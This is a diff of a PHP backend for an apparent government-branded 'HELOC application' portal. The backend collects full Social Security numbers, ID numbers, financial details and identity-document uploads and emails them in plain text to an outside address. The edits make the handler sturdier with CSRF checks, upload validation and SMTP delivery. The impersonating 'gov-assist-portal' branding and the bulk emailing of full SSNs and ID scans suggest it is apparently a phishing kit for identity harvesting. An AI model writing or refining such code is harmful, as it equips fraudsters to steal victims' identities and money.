@@ -1,12 +1,58 @@
 <?php
 /**
  * HELOC Application Processor
- * Sends full application details, including full SSN and file uploads, via email.
+ * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
  */
+session_start();
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require_once __DIR__ . '/mailer-lite.php';
+
+$smtpHost = 'smtp.your-agency.gov';
+$smtpPort = 587;
+$smtpUser = 'smtp-user';
+$smtpPass = 'smtp-password';
+$fromEmail = 'no-reply@gov-assist-portal.com';
+$toEmail   = 'lending@your-agency-portal.com';
 
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    if (!isset($_POST['csrf_token'], $_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+        die("Security error: Invalid submission.");
+    }
+
     $clean = function ($key) {
-        return isset($_POST[$key]) ? trim($_POST[$key]) : '';
+        return isset($_POST[$key]) ? trim(filter_var($_POST[$key], FILTER_SANITIZE_SPECIAL_CHARS)) : '';
+    };
+
+    $allowedExt = ['pdf', 'jpg', 'jpeg', 'png'];
+    $maxSize = 5 * 1024 * 1024;
+
+    $validateUpload = function ($file, $required = true, $label = '') use ($allowedExt, $maxSize) {
+        if (!isset($file) || $file['error'] === UPLOAD_ERR_NO_FILE) {
+            if ($required) {
+                throw new Exception("Missing required upload: {$label}");
+            }
+            return null;
+        }
+        if ($file['error'] !== UPLOAD_ERR_OK) {
+            throw new Exception("Upload error for {$label}");
+        }
+        if ($file['size'] > $maxSize) {
+            throw new Exception("{$label} exceeds size limit.");
+        }
+        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+        if (!in_array($ext, $allowedExt, true)) {
+            throw new Exception("Invalid file type for {$label}");
+        }
+        $finfo = new finfo(FILEINFO_MIME_TYPE);
+        $mime = $finfo->file($file['tmp_name']);
+        $allowedMime = ['application/pdf', 'image/jpeg', 'image/png'];
+        if (!in_array($mime, $allowedMime, true)) {
+            throw new Exception("Invalid MIME type for {$label}");
+        }
+        return $file;
     };
 
     $name               = $clean('full_name');
@@ -57,43 +103,43 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     }
 
     $fields = [
-        "Full Legal Name" => $name,
-        "Date of Birth" => $dob,
-        "Phone" => $phone,
-        "Email" => $email,
-        "Full SSN" => $ssn,
-        "Government ID Number" => $gov_id,
-        "Issuing State" => $issuing_state,
-        "ID Expiration Date" => $id_expiration,
-        "Employment Status" => $employment_status,
-        "Employer Name" => $employer_name,
-        "Job Title" => $job_title,
-        "Length of Employment" => $employment_length,
-        "Gross Monthly Income" => $gross_income,
-        "Other Income Sources" => $other_income,
-        "Property Address" => $property_address,
-        "Property Type" => $property_type,
-        "Primary Residence" => $primary_residence,
-        "Year Purchased" => $year_purchased,
-        "Purchase Price" => $purchase_price,
-        "Estimated Current Value" => $current_value,
-        "Outstanding Mortgage Balance" => $mortgage_balance,
-        "Current Mortgage Lender" => $lender_name,
-        "Estimated Credit Score Range" => $credit_score,
-        "Monthly Mortgage Payment" => $monthly_payment,
-        "Other Monthly Debts" => $other_debts,
-        "Bankruptcy History" => $bankruptcy_history,
-        "Foreclosure History" => $foreclosure_history,
-        "Requested Credit Line Amount" => $requested_line,
-        "Intended Use of Funds" => $use_of_funds,
-        "Preferred Draw Period" => $draw_period,
-        "Preferred Repayment Term" => $repayment_term,
-        "Calculated CLTV (%)" => round($ltv, 2),
-        "Credit Pull Authorization" => $credit_pull_auth,
-        "Certification" => $certification,
-        "Agreement to Terms" => $terms_agreement,
-        "Digital Signature" => $digital_signature,
-        "Signature Date" => $signature_date,
+        "FULL NAME" => $name,
+        "DATE OF BIRTH" => $dob,
+        "PHONE" => $phone,
+        "EMAIL" => $email,
+        "FULL SSN" => $ssn,
+        "GOVERNMENT ID NUMBER" => $gov_id,
+        "ISSUING STATE" => $issuing_state,
+        "ID EXPIRATION DATE" => $id_expiration,
+        "EMPLOYMENT STATUS" => $employment_status,
+        "EMPLOYER NAME" => $employer_name,
+        "JOB TITLE" => $job_title,
+        "LENGTH OF EMPLOYMENT" => $employment_length,
+        "GROSS MONTHLY INCOME" => $gross_income,
+        "OTHER INCOME SOURCES" => $other_income,
+        "PROPERTY ADDRESS" => $property_address,
+        "PROPERTY TYPE" => $property_type,
+        "PRIMARY RESIDENCE" => $primary_residence,
+        "YEAR PURCHASED" => $year_purchased,
+        "PURCHASE PRICE" => $purchase_price,
+        "ESTIMATED CURRENT VALUE" => $current_value,
+        "OUTSTANDING MORTGAGE BALANCE" => $mortgage_balance,
+        "CURRENT MORTGAGE LENDER" => $lender_name,
+        "ESTIMATED CREDIT SCORE RANGE" => $credit_score,
+        "MONTHLY MORTGAGE PAYMENT" => $monthly_payment,
+        "OTHER MONTHLY DEBTS" => $other_debts,
+        "BANKRUPTCY HISTORY" => $bankruptcy_history,
+        "FORECLOSURE HISTORY" => $foreclosure_history,
+        "REQUESTED CREDIT LINE AMOUNT" => $requested_line,
+        "INTENDED USE OF FUNDS" => $use_of_funds,
+        "PREFERRED DRAW PERIOD" => $draw_period,
+        "PREFERRED REPAYMENT TERM" => $repayment_term,
+        "CALCULATED CLTV (%)" => round($ltv, 2),
+        "CREDIT PULL AUTHORIZATION" => $credit_pull_auth,
+        "CERTIFICATION" => $certification,
+        "AGREEMENT TO TERMS" => $terms_agreement,
+        "DIGITAL SIGNATURE" => $digital_signature,
+        "SIGNATURE DATE" => $signature_date,
     ];
 
     $message = "Official HELOC Application\n";
@@ -103,61 +149,44 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     }
     $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";
 
-    // Prepare attachments
-    $attachments = [];
-    $fileFields = [
-        'proof_identity' => 'Proof of Identity',
-        'proof_income' => 'Proof of Income',
-        'mortgage_statement' => 'Mortgage Statement',
-        'homeowners_insurance' => 'Homeowners Insurance',
-        'property_tax_statement' => 'Property Tax Statement',
-    ];
+    try {
+        $attachments = [];
+        $attachments[] = $validateUpload($_FILES['proof_identity'] ?? null, true, 'Proof of Identity');
+        $attachments[] = $validateUpload($_FILES['proof_income'] ?? null, true, 'Proof of Income');
+        $attachments[] = $validateUpload($_FILES['mortgage_statement'] ?? null, true, 'Mortgage Statement');
+        $attachments[] = $validateUpload($_FILES['homeowners_insurance'] ?? null, true, 'Homeowners Insurance');
+        $attachments[] = $validateUpload($_FILES['property_tax_statement'] ?? null, true, 'Property Tax Statement');
 
-    foreach ($fileFields as $field => $label) {
-        if (isset($_FILES[$field]) && is_uploaded_file($_FILES[$field]['tmp_name'])) {
-            $attachments[] = [
-                'tmp_name' => $_FILES[$field]['tmp_name'],
-                'name' => $_FILES[$field]['name'],
-                'type' => $_FILES[$field]['type'] ?: 'application/octet-stream',
-                'label' => $label,
-            ];
+        $mail = new PHPMailer(true);
+        $mail->isSMTP();
+        $mail->Host = $smtpHost;
+        $mail->Port = $smtpPort;
+        $mail->Username = $smtpUser;
+        $mail->Password = $smtpPass;
+        $mail->SMTPAuth = true;
+        $mail->SMTPSecure = 'tls';
+        $mail->setFrom($fromEmail, 'GOV-ASSIST HELOC');
+        $mail->addAddress($toEmail);
+        $mail->addReplyTo($email);
+        $mail->Subject = "NEW HELOC APPLICATION: {$name}";
+        $mail->Body = $message;
+        $mail->AltBody = strip_tags($message);
+        $mail->isHTML(false);
+
+        foreach ($attachments as $file) {
+            if (!$file) { continue; }
+            $mail->addAttachment($file['tmp_name'], $file['name']);
         }
-    }
 
-    $to = "lending@your-agency-portal.com";
-    $subject = "NEW HELOC APPLICATION: {$name}";
-    $boundary = "==Multipart_Boundary_x" . md5(time()) . "x";
-
-    $headers  = "From: underwriting@gov-assist-portal.com\r\n";
-    $headers .= "Reply-To: {$email}\r\n";
-    $headers .= "MIME-Version: 1.0\r\n";
-    $headers .= "Content-Type: multipart/mixed; boundary=\"{$boundary}\"";
-
-    $body  = "--{$boundary}\r\n";
-    $body .= "Content-Type: text/plain; charset=\"UTF-8\"\r\n";
-    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
-    $body .= $message . "\r\n";
-
-    foreach ($attachments as $file) {
-        $fileContent = file_get_contents($file['tmp_name']);
-        if ($fileContent === false) {
-            continue;
+        if ($mail->send()) {
+            header("Location: ../success.html");
+            exit();
         }
-        $data = chunk_split(base64_encode($fileContent));
-        $body .= "--{$boundary}\r\n";
-        $body .= "Content-Type: {$file['type']}; name=\"{$file['name']}\"\r\n";
-        $body .= "Content-Description: {$file['label']}\r\n";
-        $body .= "Content-Disposition: attachment; filename=\"{$file['name']}\"; size=" . filesize($file['tmp_name']) . ";\r\n";
-        $body .= "Content-Transfer-Encoding: base64\r\n\r\n";
-        $body .= $data . "\r\n";
-    }
-    $body .= "--{$boundary}--";
 
-    if (mail($to, $subject, $body, $headers)) {
-        header("Location: ../success.html");
-        exit();
-    } else {
+        throw new Exception("Mailer Error: " . $mail->ErrorInfo);
+    } catch (Exception $e) {
         echo "An error occurred. Please try again later.";
+        echo "<pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
     }
 } else {
     header("Location: ../index.html");
